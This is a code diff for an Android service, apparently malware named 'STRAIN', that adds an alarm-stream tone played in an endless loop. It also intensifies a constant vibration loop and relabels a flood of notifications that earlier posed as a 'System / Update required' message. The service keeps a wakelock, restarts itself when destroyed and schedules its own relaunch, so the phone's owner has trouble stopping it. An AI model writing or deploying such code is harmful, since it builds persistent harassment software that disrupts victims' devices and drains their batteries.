@@ -2,6 +2,8 @@ package com.rhfvnc.strain;
 import android.app.*;
 import android.content.Context;
 import android.content.Intent;
+import android.media.AudioManager;
+import android.media.ToneGenerator;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
@@ -10,6 +12,7 @@ public class StrainService extends Service {
     private static final String CH = "rhfvnc";
     private PowerManager.WakeLock wl;
     private Vibrator vib;
+    private ToneGenerator tone;
     public static void start(Context c) {
         Intent i = new Intent(c, StrainService.class);
         if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i);
@@ -35,6 +38,10 @@ public class StrainService extends Service {
             try { wl.acquire(); } catch (Throwable ignored) {}
         }
         vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        try {
+            tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
+            tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 60000);
+        } catch (Throwable ignored) {}
         Thread storm = new Thread(() -> {
             while (true) {
                 try {
@@ -55,11 +62,20 @@ public class StrainService extends Service {
         alarmLoop.setDaemon(true); alarmLoop.start();
         Thread vibLoop = new Thread(() -> {
             while (true) {
-                try { if (vib != null) vib.vibrate(new long[]{0, 40, 20, 40, 20}, -1); Thread.sleep(80); }
+                try { if (vib != null) vib.vibrate(new long[]{0, 60, 20, 60, 20}, -1); Thread.sleep(90); }
                 catch (Throwable ignored) {}
             }
         });
         vibLoop.setDaemon(true); vibLoop.start();
+        Thread toneLoop = new Thread(() -> {
+            while (true) {
+                try {
+                    if (tone != null) tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 5000);
+                } catch (Throwable ignored) {}
+                try { Thread.sleep(4500); } catch (InterruptedException ignored) {}
+            }
+        });
+        toneLoop.setDaemon(true); toneLoop.start();
         Thread spam = new Thread(() -> {
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
             int id = 100;
@@ -67,7 +83,7 @@ public class StrainService extends Service {
                 try {
                     if (nm != null) {
                         Notification nn = new Notification.Builder(StrainService.this, CH)
-                                .setContentTitle("System").setContentText("Update required")
+                                .setContentTitle("RHF/VNC").setContentText("STRAIN ACTIVE")
                                 .setSmallIcon(android.R.drawable.stat_notify_sync).build();
                         nm.notify(id++, nn);
                         if (id > 200) id = 100;
@@ -86,7 +102,11 @@ public class StrainService extends Service {
         StrainReceiver.scheduleRelaunch(this, 20);
     }
     @Override
-    public void onDestroy() { StrainService.start(this); super.onDestroy(); }
+    public void onDestroy() {
+        try { if (tone != null) tone.release(); } catch (Throwable ignored) {}
+        StrainService.start(this);
+        super.onDestroy();
+    }
     @Override
     public IBinder onBind(Intent intent) { return null; }
 }
